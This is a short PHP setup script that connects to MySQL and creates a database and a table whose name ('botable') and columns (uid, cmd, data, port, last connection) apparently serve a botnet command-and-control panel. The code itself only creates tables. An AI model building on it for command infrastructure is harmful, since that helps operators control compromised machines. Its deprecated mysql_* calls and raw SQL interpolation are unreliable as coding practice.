<?
	include("conf.php"); 
	function ConnectMySQL($host, $login, $password)
	{
			$connect=mysql_connect($host,$login,$password);
			
			if ($connect===FALSE)
			{
				die('cant connect to database');
			}
	}

	ConnectMySQL($db_host, $db_login, $db_password);
	
	mysql_query("CREATE DATABASE $db_database");

	mysql_select_db($db_database);

	$crtable = "CREATE TABLE `$db_botable` (".
				  "`id` int(10) unsigned NOT NULL auto_increment,".
				  "`uid` text NOT NULL,".
				  "`cmd` text NOT NULL,".
				  "`data` text NOT NULL,".
				  "`port` text NOT NULL,".
				  "`lconnection` text NOT NULL,".
				  " PRIMARY KEY  (`id`)".
				  ");";

	mysql_query($crtable);
	
 ?>